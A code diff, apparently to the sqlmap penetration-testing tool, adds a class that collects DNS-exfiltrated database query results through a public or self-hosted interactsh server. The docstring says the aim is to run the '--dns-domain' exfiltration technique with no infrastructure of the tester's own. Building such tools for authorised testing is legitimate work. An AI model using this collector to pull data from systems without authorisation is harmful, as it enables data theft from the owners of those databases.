@@ -225,6 +225,60 @@ class DNSServer(object):
         thread.daemon = True
         thread.start()
 
+class InteractshDNSServer(object):
+    """DNS exfiltration collector backed by a public (or self-hosted) interactsh
+    interaction server instead of a locally-bound privileged :53 socket. This lets
+    the '--dns-domain' data-exfiltration technique run with zero infrastructure - no
+    delegated authoritative domain, no root/Administrator, no reachable listener -
+    by resolving lookups under the interactsh correlation domain and polling them
+    back. It presents the same run()/pop(prefix, suffix) surface as DNSServer, so it
+    is a drop-in for conf.dnsServer.
+    """
+
+    def __init__(self, server=None):
+        from lib.request.interactsh import Interactsh, hasCrypto
+
+        if not hasCrypto():
+            raise socket.error("interactsh-backed DNS exfiltration requires the optional 'pycryptodome' package")
+
+        self._client = Interactsh(server=server)
+
+        if not self._client.registered:
+            raise socket.error("could not register with an interactsh interaction server")
+
+        self.domain = self._client.dnsDomain()
+        self._seen = set()
+        self._running = True
+        self._initialized = True
+
+    def run(self):
+        """No background listener is needed - interactsh does the receiving."""
+        pass
+
+    def pop(self, prefix=None, suffix=None):
+        """
+        Returns a captured DNS lookup name matching the given prefix/suffix
+        (prefix.<query result>.suffix.<correlation domain>), mirroring DNSServer.pop().
+        """
+
+        retVal = None
+
+        for name in self._client.dnsNames():
+            if name in self._seen:
+                continue
+
+            if prefix is None and suffix is None:
+                self._seen.add(name)
+                retVal = name
+                break
+
+            if prefix and suffix and re.search(r"%s\..+\.%s" % (re.escape(prefix), re.escape(suffix)), name, re.I):
+                self._seen.add(name)
+                retVal = name
+                break
+
+        return retVal
+
 if __name__ == "__main__":
     server = None
     try:
